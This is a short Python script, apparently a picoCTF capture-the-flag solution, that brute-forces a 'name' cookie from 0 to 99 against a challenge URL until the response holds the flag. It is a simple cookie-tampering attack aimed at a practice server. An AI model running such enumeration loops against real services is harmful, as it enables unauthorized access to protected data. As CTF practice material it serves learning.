import requests

url = "http://mercury.picoctf.net:29649/check"

cookies = {"name":"1"}



for i in range(100):
    print(i)
    cookies = {"name":f"{i}"}
    res = requests.get(url, cookies=cookies )
    if b"picoctf{" in res.content.lower():
        print(res.content)
        break
